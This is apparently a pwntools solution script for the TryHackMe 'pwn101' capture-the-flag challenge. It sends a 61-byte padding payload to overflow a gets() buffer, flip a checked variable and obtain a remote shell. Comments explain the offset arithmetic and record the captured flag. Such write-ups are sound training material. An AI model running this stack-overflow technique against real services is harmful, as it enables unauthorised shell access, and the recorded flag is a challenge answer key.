#!/usr/bin/env python3

from pwn import *

exe = './pwn101.pwn101'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

p = remote('10.10.159.253',9001)

rop =ROP(elf)

padding = 61

payload = flat(
    'A'*padding,
)
p.sendlineafter(b':',payload)
p.interactive()

#flag : THM{7h4t's_4n_3zy_oveRflowwwww}
#0x00005555554008da <+76>:	cmp    DWORD PTR [rbp-0x4],0x539
#0x00005555554008e1 <+83>:	jne    0x5555554008f9 <main+107>
#jump on not equal to 0x539 = 1337 in decimal
#if not equal it calls system with parameters '/bin/sh' and we get 
#a shell. So all we have to do is send a payload big enough to cause buffer 
#overflow and smaller than 1337 in size
#variable at 0x4 and gets() at 0x40, so to overwrite 4byte variable we need to supply payload of length 
#[(0x40-0x4) +1] bytes since if we want to change value of 4 byte variable, overwriting even 1 byte of it is enough
# 0x40 = 64 in decimal, 0x4 = 4 in decimal so (64 -4 +1) = 61 bytes of payload
